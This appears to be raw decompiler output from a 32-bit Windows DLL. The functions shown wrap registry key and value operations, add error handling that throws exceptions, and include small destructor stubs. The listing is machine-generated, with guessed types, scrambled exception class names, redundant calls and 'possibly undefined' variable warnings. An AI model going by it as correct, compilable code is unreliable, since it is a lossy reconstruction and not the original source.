// 100741CC: using guessed type int (__thiscall *off_100741CC[4])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001C71A) --------------------------------------------------------
LONG __thiscall sub_1001C71A(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_100741D0;
  v7 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v4 = sub_1001C9AA((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 1);
  LOBYTE(v7) = 0;
  return sub_1000C45D(v6);
}
// 100741D0: using guessed type int (__thiscall *off_100741D0[3])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001C783) --------------------------------------------------------
LONG __thiscall sub_1001C783(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_100741D0;
  v7 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v4 = sub_1001C9AA((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 2);
  LOBYTE(v7) = 0;
  return sub_1000C45D(v6);
}
// 100741D0: using guessed type int (__thiscall *off_100741D0[3])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001C7EC) --------------------------------------------------------
LONG __thiscall sub_1001C7EC(void *this, int a2)
{
  int v3; // eax
  int v5[6]; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+28h] [ebp-10h]
  int v7; // [esp+34h] [ebp-4h]

  v5[5] = (int)off_100741D4;
  v7 = 0;
  sub_1000922C();
  v6 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v3 = sub_1001CB65(a2, (int)v5);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 32))(v6, (int)this + 4, (int)this + 12, v3, 7);
  LOBYTE(v7) = 0;
  return sub_1000C45D(v5);
}
// 100741D4: using guessed type int (__thiscall *off_100741D4[2])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001C857) --------------------------------------------------------
int __thiscall sub_1001C857(void *this)
{
  int v2; // eax
  int v4[5]; // [esp+10h] [ebp-24h] BYREF
  int v5[4]; // [esp+24h] [ebp-10h] BYREF

  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v2 + 28))(v2, v4, (int)this + 4, (int)this + 12, v5);
  v5[3] = -1;
  sub_1000C45D(v4);
  return v5[0];
}
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C857: using guessed type int var_24[5];

//----- (1001C8A8) --------------------------------------------------------
_DWORD *__thiscall sub_1001C8A8(_DWORD *Block, char a2)
{
  *Block = off_100741CC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100741CC: using guessed type int (__thiscall *off_100741CC[4])(void *Block, char);

//----- (1001C8D7) --------------------------------------------------------
int __stdcall sub_1001C8D7(int a1, int a2)
{
  sub_1000C28D((void *)4, a1, &a2);
  return a1;
}

//----- (1001C917) --------------------------------------------------------
_DWORD *__thiscall sub_1001C917(_DWORD *Block, char a2)
{
  *Block = off_100741D0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100741D0: using guessed type int (__thiscall *off_100741D0[3])(void *Block, char);

//----- (1001C93E) --------------------------------------------------------
_DWORD *__thiscall sub_1001C93E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ecx
  wchar_t *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  if ( sub_1000C52E(this) )
  {
    v3 = (wchar_t *)sub_1000C52E(v2);
    sub_10009D2C(v5, v3);
    v7 = 1;
    sub_10009F32(a2, (int)v5);
    v6 = 1;
    LOBYTE(v7) = 0;
    sub_10009F65(v5);
  }
  else
  {
    sub_10009D2C(a2, &word_1008EE44);
    v7 = 0;
    v6 = 1;
  }
  return a2;
}
// 1001C972: variable 'v2' is possibly undefined

//----- (1001C9AA) --------------------------------------------------------
int __stdcall sub_1001C9AA(int a1, int a2)
{
  size_t v2; // eax
  void *v4; // [esp-4h] [ebp-24h]

  v4 = *(void **)(*(_DWORD *)(a2 + 4) + 12);
  v2 = sub_1000A1F9(a2);
  sub_1000C28D((void *)(2 * v2 + 2), a1, v4);
  return a1;
}

//----- (1001C9F5) --------------------------------------------------------
_DWORD *__thiscall sub_1001C9F5(_DWORD *Block, char a2)
{
  *Block = off_100741D4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100741D4: using guessed type int (__thiscall *off_100741D4[2])(void *Block, char);

//----- (1001CA1C) --------------------------------------------------------
_DWORD *__thiscall sub_1001CA1C(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  bool v4; // bl
  size_t v5; // eax
  int v7[5]; // [esp+10h] [ebp-4Ch] BYREF
  int v8[4]; // [esp+24h] [ebp-38h] BYREF
  int v9[2]; // [esp+34h] [ebp-28h] BYREF
  int v10[2]; // [esp+3Ch] [ebp-20h] BYREF
  unsigned int pExceptionObject; // [esp+44h] [ebp-18h] BYREF
  int v12; // [esp+48h] [ebp-14h]
  char v13; // [esp+4Fh] [ebp-Dh]
  int v14; // [esp+58h] [ebp-4h]

  v12 = 0;
  sub_10006715(v8);
  v14 = 1;
  if ( sub_1000C52E(this) )
  {
    pExceptionObject = 0;
    v13 = 0;
    do
    {
      v3 = (_DWORD *)sub_1000C709(this[3] - pExceptionObject, this, (int)v7, pExceptionObject);
      LOBYTE(v14) = 2;
      sub_10009DF1(v3, v10);
      LOBYTE(v14) = 4;
      sub_1000C45D(v7);
      v4 = 1;
      if ( sub_1000A1F9((int)v10) )
      {
        sub_10009D2C(v9, &word_1008EE48);
        LOBYTE(v14) = 5;
        v12 |= 2u;
        if ( sub_1000A1C0((int)v9, (int)v10) )
          v4 = 0;
      }
      v14 = 4;
      if ( (v12 & 2) != 0 )
      {
        v12 &= ~2u;
        sub_10009F65(v9);
      }
      if ( v4 )
      {
        v13 = 1;
      }
      else
      {
        sub_100023AB(v8, (int)v10);
        v5 = sub_1000A1F9((int)v10);
        pExceptionObject += 2 * v5 + 2;
        if ( pExceptionObject >= this[3] )
        {
          sub_1002E45A(&pExceptionObject);
          _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
        }
      }
      LOBYTE(v14) = 1;
      sub_10009F65(v10);
    }
    while ( !v13 );
    sub_100021D4(v8, a2);
    v12 |= 1u;
    LOBYTE(v14) = 0;
  }
  else
  {
    sub_100021D4(v8, a2);
    v12 = 1;
    LOBYTE(v14) = 0;
  }
  sub_100022C5(v8);
  return a2;
}
// 1001CA1C: using guessed type int var_38[4];
// 1001CA1C: using guessed type int var_4C[5];

//----- (1001CB65) --------------------------------------------------------
int __userpurge sub_1001CB65@<eax>(int a1@<edi>, int a2)
{
  char *i; // esi
  int v3; // eax
  int v4; // eax
  size_t v5; // eax
  _DWORD *v6; // eax
  int v8[5]; // [esp+10h] [ebp-38h] BYREF
  int v9[8]; // [esp+24h] [ebp-24h] BYREF
  int v10; // [esp+44h] [ebp-4h]

  sub_1000C28D(0, a2, 0);
  v10 = 0;
  v9[5] = 1;
  sub_1000C28D((void *)2, (int)v9, 0);
  v10 = 1;
  sub_1000C7EE(v9, 0);
  for ( i = 0; (unsigned int)i < (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1); ++i )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 48))(a1);
    v4 = (*(int (__thiscall **)(int, char *, _DWORD))(*(_DWORD *)a1 + 48))(a1, i, *(_DWORD *)(*(_DWORD *)(v3 + 4) + 12));
    v5 = sub_1000A1F9(v4);
    v6 = (_DWORD *)sub_1000C28D((void *)(2 * v5 + 2), (int)v8, i);
    LOBYTE(v10) = 2;
    sub_1000C5DF(v6, a2);
    LOBYTE(v10) = 1;
    sub_1000C45D(v8);
  }
  sub_1000C5DF(v9, a2);
  LOBYTE(v10) = 0;
  sub_1000C45D(v9);
  return a2;
}
// 1001CB65: using guessed type int var_38[5];

//----- (1001CC37) --------------------------------------------------------
_DWORD *__thiscall sub_1001CC37(_DWORD *Block, char a2)
{
  *Block = &off_100741F0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100741F0: using guessed type int (__thiscall *off_100741F0)(void *Block, char);

//----- (1001CC57) --------------------------------------------------------
_DWORD *__stdcall sub_1001CC57(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_100741F0;
  *a1 = &off_10074220;
  a1[1] = 983103;
  return result;
}
// 100741F0: using guessed type int (__thiscall *off_100741F0)(void *Block, char);
// 10074220: using guessed type int (__thiscall *off_10074220)(void *Block, char);

//----- (1001CC89) --------------------------------------------------------
_DWORD *__thiscall sub_1001CC89(_DWORD *Block, char a2)
{
  sub_1001CCA8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001CCA8) --------------------------------------------------------
void __thiscall sub_1001CCA8(_DWORD *this)
{
  *this = &off_10074220;
  *this = &off_100741F0;
}
// 100741F0: using guessed type int (__thiscall *off_100741F0)(void *Block, char);
// 10074220: using guessed type int (__thiscall *off_10074220)(void *Block, char);

//----- (1001CCCD) --------------------------------------------------------
char __thiscall sub_1001CCCD(void *this, HKEY a2)
{
  int v2; // eax
  REGSAM v4; // [esp-8h] [ebp-4Ch]
  HKEY phkResult; // [esp+10h] [ebp-34h] BYREF
  DWORD dwErrCode; // [esp+14h] [ebp-30h] BYREF
  int v7; // [esp+18h] [ebp-2Ch] BYREF
  int v8[2]; // [esp+1Ch] [ebp-28h] BYREF
  HKEY v9[2]; // [esp+24h] [ebp-20h] BYREF
  _DWORD v10[3]; // [esp+2Ch] [ebp-18h] BYREF
  int v11; // [esp+40h] [ebp-4h]

  dwErrCode = (DWORD)this;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_1001D995(a2);
  sub_10025E32(v2, v9);
  v11 = 0;
  sub_1001DB15(v8, (int)a2);
  LOBYTE(v11) = 1;
  v4 = *(_DWORD *)(dwErrCode + 4);
  phkResult = 0;
  dwErrCode = RegOpenKeyExW(v9[1], *(LPCWSTR *)(v8[1] + 12), 0, v4, &phkResult);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10025E32((int)phkResult, v10);
  LOBYTE(v11) = 2;
  SetLastError(dwErrCode);
  if ( dwErrCode )
  {
    if ( dwErrCode != 2 )
    {
      if ( dwErrCode != 5 )
      {
        sub_1002E45A(&dwErrCode);
        _CxxThrowException(&dwErrCode, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
      }
      SetLastError(5u);
      sub_1002E641(&v7);
      _CxxThrowException(&v7, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
    }
    LOBYTE(v11) = 1;
    sub_1001DC81(v10);
    LOBYTE(v11) = 0;
    sub_10009F65(v8);
    v11 = -1;
    sub_1001DC81(v9);
    return 0;
  }
  else
  {
    LOBYTE(v11) = 1;
    sub_1001DC81(v10);
    LOBYTE(v11) = 0;
    sub_10009F65(v8);
    v11 = -1;
    sub_1001DC81(v9);
    return 1;
  }
}
// 10076520: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;
// 1001CCCD: using guessed type _DWORD var_18[3];

//----- (1001CE7E) --------------------------------------------------------
HKEY __stdcall sub_1001CE7E(int a1, HKEY a2)
{
  int v2; // eax
  DWORD v3; // esi
  DWORD v4; // esi
  HKEY v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-30h] BYREF
  int v8; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+14h] [ebp-28h] BYREF
  HKEY phkResult; // [esp+18h] [ebp-24h] BYREF
  int v11[2]; // [esp+1Ch] [ebp-20h] BYREF
  HKEY v12[3]; // [esp+24h] [ebp-18h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_1001D995(a2);
  sub_10025E32(v2, v12);
  v13 = 0;
  sub_1001DB15(v11, (int)a2);
  LOBYTE(v13) = 1;
  v3 = RegOpenKeyExW(v12[1], *(LPCWSTR *)(v11[1] + 12), 0, *(_DWORD *)(a1 + 4), &phkResult);
  SetLastError(v3);
  if ( v3 )
  {
    v4 = v3 - 2;
    if ( v4 )
    {
      if ( v4 != 3 )
      {
        sub_1002E45A(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
      }
      sub_1002E641(&v8);
      _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
    }
    sub_1002E59F(&v9);
    _CxxThrowException(&v9, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = phkResult;
  LOBYTE(v13) = 0;
  sub_10009F65(v11);
  v13 = -1;
  sub_1001DC81(v12);
  return v5;
}
// 10076520: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;

//----- (1001CFDC) --------------------------------------------------------
HKEY __usercall sub_1001CFDC@<eax>(HKEY result@<eax>, int a2@<ecx>)
{
  DWORD v2; // eax
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = a2;
  if ( result != HKEY_CLASSES_ROOT
    && result != HKEY_CURRENT_USER
    && result != HKEY_LOCAL_MACHINE
    && result != HKEY_USERS
    && result != HKEY_PERFORMANCE_DATA
    && result != HKEY_CURRENT_CONFIG
    && result != HKEY_DYN_DATA )
  {
    v2 = RegCloseKey(result);
    SetLastError(v2);
    result = (HKEY)GetLastError();
    if ( result )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  return result;
}

//----- (1001D042) --------------------------------------------------------
void __thiscall sub_1001D042(void *this, HKEY a2)
{
  int v2; // eax
  DWORD v3; // esi
  int v4; // ecx
  int pExceptionObject; // [esp+10h] [ebp-34h] BYREF
  HKEY phkResult; // [esp+14h] [ebp-30h] BYREF
  int v7[2]; // [esp+18h] [ebp-2Ch] BYREF
  int v8[2]; // [esp+20h] [ebp-24h] BYREF
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+28h] [ebp-1Ch] BYREF
  int v10; // [esp+40h] [ebp-4h]

  if ( (*(unsigned __int8 (__thiscall **)(void *, HKEY))(*(_DWORD *)this + 4))(this, a2) )
  {
    sub_1002E5F0(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__);
  }
  sub_1001DB15(v8, (int)a2);
  v10 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_1001D995(a2);
  sub_10025E32(v2, v7);
  LOBYTE(v10) = 1;
  SecurityAttributes.nLength = 12;
  SecurityAttributes.lpSecurityDescriptor = 0;
  SecurityAttributes.bInheritHandle = 0;
  v3 = RegCreateKeyExW(
         (HKEY)v7[1],
         *(LPCWSTR *)(v8[1] + 12),
         0,
         &Class,
         0,
         0x2001Fu,
         &SecurityAttributes,
         &phkResult,
         0);
  SetLastError(v3);
  if ( v3 )
  {
    sub_1002E45A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  sub_1001CFDC(phkResult, v4);
  LOBYTE(v10) = 0;
  sub_1001DC81(v7);
  v10 = -1;
  sub_10009F65(v8);
}
// 1001D12A: variable 'v4' is possibly undefined

//----- (1001D1AF) --------------------------------------------------------
char __stdcall sub_1001D1AF(HKEY phkResult)
{
  int v1; // eax
  DWORD v2; // esi
  int pExceptionObject; // [esp+Ch] [ebp-28h] BYREF
  int v5; // [esp+10h] [ebp-24h] BYREF
  int v6[2]; // [esp+14h] [ebp-20h] BYREF
  HKEY v7[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v1 = sub_1001D995(phkResult);
  sub_10025E32(v1, v7);
  v8 = 0;
  sub_1001DB15(v6, (int)phkResult);
  LOBYTE(v8) = 1;
  v2 = RegDeleteKeyW(v7[1], *(LPCWSTR *)(v6[1] + 12));
  SetLastError(v2);
  if ( v2 )
  {
    if ( v2 != 2 )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_1002E59F(&v5);
    _CxxThrowException(&v5, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  LOBYTE(v8) = 0;
  sub_10009F65(v6);
  v8 = -1;
  return sub_1001DC81(v7);
}

//----- (1001D28F) --------------------------------------------------------
void __thiscall sub_1001D28F(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex)
{
  HKEY v4; // ebx
  int v5; // ecx
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-22Ch] BYREF
  void *v7; // [esp+18h] [ebp-224h]
  DWORD cchName; // [esp+1Ch] [ebp-220h] BYREF
  int v9; // [esp+20h] [ebp-21Ch] BYREF
  int v10; // [esp+24h] [ebp-218h]
  DWORD dwErrCode; // [esp+28h] [ebp-214h] BYREF
  WCHAR Name[262]; // [esp+2Ch] [ebp-210h] BYREF
  int v13; // [esp+238h] [ebp-4h]

  v10 = 0;
  v7 = a2;
  cchName = 255;
  v4 = sub_1001CE7E((int)this, a3);
  dwErrCode = RegEnumKeyExW(v4, dwIndex, Name, &cchName, 0, 0, 0, &ftLastWriteTime);
  sub_1001CFDC(v4, v5);
  SetLastError(dwErrCode);
  if ( dwErrCode )
  {
    if ( dwErrCode == 2 )
    {
      sub_1002E4FD(&v9);
      _CxxThrowException(&v9, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
    }
    if ( dwErrCode != 234 && dwErrCode != 259 )
    {
      sub_1002E45A(&dwErrCode);
      _CxxThrowException(&dwErrCode, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  sub_10009D2C(a2, Name);
  v13 = 0;
  v10 = 1;
  sub_10056753();
}
// 1001D2EF: variable 'v5' is possibly undefined

//----- (1001D374) --------------------------------------------------------
DWORD __thiscall sub_1001D374(void *this, HKEY a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  DWORD v5; // esi
  int pExceptionObject; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+14h] [ebp-20h] BYREF
  DWORD cSubKeys; // [esp+18h] [ebp-1Ch] BYREF
  HKEY v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001CE7E((int)this, a2);
  sub_10025E32((int)v3, v10);
  v11 = 0;
  v4 = RegQueryInfoKeyA(v10[1], 0, 0, 0, &cSubKeys, 0, 0, 0, 0, 0, 0, 0);
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 2 )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_1002E59F(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = cSubKeys;
  v11 = -1;
  sub_1001DC81(v10);
  return v5;
}

//----- (1001D445) --------------------------------------------------------
char __thiscall sub_1001D445(void *this, HKEY a2, int a3)
{
  HKEY v4; // eax
  DWORD v5; // edi
  int pExceptionObject; // [esp+10h] [ebp-24h] BYREF
  DWORD cbData; // [esp+14h] [ebp-20h] BYREF
  DWORD Type; // [esp+18h] [ebp-1Ch] BYREF
  int v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *, HKEY))(*(_DWORD *)this + 4))(this, a2) )
    return 1;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_1001CE7E((int)this, a2);
  sub_10025E32((int)v4, v10);
  v11 = 0;
  v5 = RegQueryValueExW((HKEY)v10[1], *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12), 0, &Type, 0, &cbData);
  SetLastError(v5);
  if ( !v5 )
  {
    v11 = -1;
    sub_1001DC81(v10);
    return 1;
  }
  if ( v5 != 2 )
  {
    sub_1002E45A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  v11 = -1;
  sub_1001DC81(v10);
  return 0;
}

//----- (1001D526) --------------------------------------------------------
_DWORD *__thiscall sub_1001D526(void *this, _DWORD *a2, HKEY a3, int pExceptionObject, DWORD *a5)
{
  HKEY v6; // eax
  const WCHAR *v7; // ebx
  BYTE *v8; // eax
  DWORD v9; // esi
  int v11; // [esp+10h] [ebp-20h] BYREF
  HKEY hKey; // [esp+14h] [ebp-1Ch]
  int v13; // [esp+18h] [ebp-18h]
  DWORD Type; // [esp+1Ch] [ebp-14h] BYREF
  DWORD cbData[3]; // [esp+20h] [ebp-10h] BYREF
  int v16; // [esp+2Ch] [ebp-4h]

  v16 = 0;
  v13 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_1001CE7E((int)this, a3);
  sub_10025E32((int)v6, &v11);
  v16 = 1;
  a3 = (HKEY)RegQueryValueExW(hKey, *(LPCWSTR *)(*(_DWORD *)(pExceptionObject + 4) + 12), 0, &Type, 0, cbData);
  SetLastError((DWORD)a3);
  if ( a3 )
  {
    if ( a3 != (HKEY)2 )
      goto LABEL_3;
    goto LABEL_4;
  }
  sub_1000C28D((void *)cbData[0], (int)a2, 0);
  v7 = *(const WCHAR **)(*(_DWORD *)(pExceptionObject + 4) + 12);
  v13 = 1;
  v8 = (BYTE *)sub_1000C50A(a2);
  v9 = RegQueryValueExW(hKey, v7, 0, &Type, v8, cbData);
  *(_BYTE *)(a2[1] + 8) = 1;
  SetLastError(v9);
  if ( v9 )
  {
    if ( v9 != 2 )
    {
LABEL_3:
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
LABEL_4:
    sub_1002E4FD(&a3);
    _CxxThrowException(&a3, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  *a5 = Type;
  LOBYTE(v16) = 0;
  sub_1001DC81(&v11);
  return a2;
}

//----- (1001D62D) --------------------------------------------------------
char __thiscall sub_1001D62D(void *this, HKEY a2, int a3, _DWORD *a4, DWORD dwType)
{
  HKEY v6; // eax
  const WCHAR *v7; // esi
  const BYTE *v8; // eax
  DWORD v9; // esi
  DWORD v11; // [esp-4h] [ebp-30h]
  int pExceptionObject; // [esp+10h] [ebp-1Ch] BYREF
  HKEY v13[3]; // [esp+14h] [ebp-18h] BYREF
  int v14; // [esp+28h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_1001CE7E((int)this, a2);
  sub_10025E32((int)v6, v13);
  v14 = 0;
  v7 = *(const WCHAR **)(*(_DWORD *)(a3 + 4) + 12);
  v11 = a4[3];
  v8 = (const BYTE *)sub_1000C52E(a4);
  v9 = RegSetValueExW(v13[1], v7, 0, dwType, v8, v11);
  SetLastError(v9);
  if ( v9 )
  {
    sub_1002E45A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  v14 = -1;
  return sub_1001DC81(v13);
}

//----- (1001D6EB) --------------------------------------------------------
char __thiscall sub_1001D6EB(void *this, HKEY a2, int a3)
{
  HKEY v4; // eax
  DWORD v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-28h] BYREF
  int v8; // [esp+10h] [ebp-24h] BYREF
  int v9[2]; // [esp+14h] [ebp-20h] BYREF
  HKEY v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_1001CE7E((int)this, a2);
  sub_10025E32((int)v4, v10);
  v11 = 0;
  sub_10009F32(v9, a3);
  LOBYTE(v11) = 1;
  v5 = RegDeleteValueW(v10[1], *(LPCWSTR *)(v9[1] + 12));
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_1002E4FD(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  LOBYTE(v11) = 0;
  sub_10009F65(v9);
  v11 = -1;
  return sub_1001DC81(v10);
}

//----- (1001D7CE) --------------------------------------------------------
void __thiscall sub_1001D7CE(void *this, void *a2, HKEY a3, DWORD dwIndex)
{
  HKEY v5; // eax
  DWORD v6; // edi
  DWORD v7; // edi
  DWORD v8; // edi
  HKEY v9[2]; // [esp+10h] [ebp-22Ch] BYREF
  DWORD cchValueName; // [esp+18h] [ebp-224h] BYREF
  int pExceptionObject; // [esp+1Ch] [ebp-220h] BYREF
  int v12; // [esp+20h] [ebp-21Ch]
  int v13; // [esp+24h] [ebp-218h] BYREF
  void *v14; // [esp+28h] [ebp-214h]
  WCHAR ValueName[262]; // [esp+2Ch] [ebp-210h] BYREF
  int v16; // [esp+238h] [ebp-4h]

  v12 = 0;
  v14 = a2;
  cchValueName = 255;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v5 = sub_1001CE7E((int)this, a3);
  sub_10025E32((int)v5, v9);
  v16 = 1;
  v6 = RegEnumValueW(v9[1], dwIndex, ValueName, &cchValueName, 0, 0, 0, 0);
  SetLastError(v6);
  if ( v6 )
  {
    v7 = v6 - 2;
    if ( !v7 )
    {
      sub_1002E4FD(&v13);
      _CxxThrowException(&v13, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
    }
    v8 = v7 - 232;
    if ( v8 && v8 != 25 )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  sub_10009D2C(v14, ValueName);
  v12 = 1;
  LOBYTE(v16) = 0;
  sub_1001DC81(v9);
  sub_10056753();
}

//----- (1001D8C9) --------------------------------------------------------
DWORD __thiscall sub_1001D8C9(void *this, HKEY a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  DWORD v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-20h] BYREF
  DWORD cValues; // [esp+10h] [ebp-1Ch] BYREF
  HKEY v9[3]; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1001CE7E((int)this, a2);
  sub_10025E32((int)v3, v9);
  v10 = 0;
  v4 = RegQueryInfoKeyA(v9[1], 0, 0, 0, 0, 0, 0, &cValues, 0, 0, 0, 0);
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 2 )
    {
      sub_1002E45A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_1002E59F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = cValues;
  v10 = -1;
  sub_1001DC81(v9);
  return v5;
}

//----- (1001D995) --------------------------------------------------------
unsigned int __stdcall sub_1001D995(HKEY phkResult)
{
  unsigned int v1; // esi
  DWORD v3; // esi
  int v4[21]; // [esp+10h] [ebp-94h] BYREF
  int v5[7]; // [esp+64h] [ebp-40h] BYREF
  int v6[2]; // [esp+80h] [ebp-24h] BYREF
  int v7; // [esp+88h] [ebp-1Ch] BYREF
  int v8; // [esp+8Ch] [ebp-18h] BYREF
  _DWORD pExceptionObject[4]; // [esp+90h] [ebp-14h] BYREF
  int v10; // [esp+A0h] [ebp-4h]

  sub_1002E692(v4, (int)phkResult);
  v10 = 0;
  sub_1002E818(v4, v5);
